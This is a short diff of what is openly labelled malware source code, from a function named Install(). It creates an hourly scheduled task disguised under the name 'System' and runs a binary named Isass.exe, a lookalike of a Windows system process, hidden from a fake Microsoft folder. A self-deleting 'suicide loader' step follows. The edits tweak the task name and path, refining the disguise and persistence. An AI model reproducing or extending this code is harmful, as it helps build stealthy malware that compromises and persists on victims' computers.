@@ -68,10 +68,10 @@ void Install()
 	system("del CreateShortcut.vbs");
 
 	// add to autoload part 3
-	system("powershell.exe SCHTASKS.exe /Create /SC HOURLY /TN \"System Host\" /TR C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\Isass.exe /F");
+	system("powershell.exe SCHTASKS.exe /Create /SC HOURLY /TN \"System\" /TR C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\Isass.exe /F");
 
 	// starting malware
-	WinExec("C:\\ProgramData\\Microsoft Corporation\\Windows\\SystemData\\Isass.exe", SW_HIDE);
+	WinExec("C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\Isass.exe", SW_HIDE);
 
 	// suicide loader
 	char current_work_dir[FILENAME_MAX];
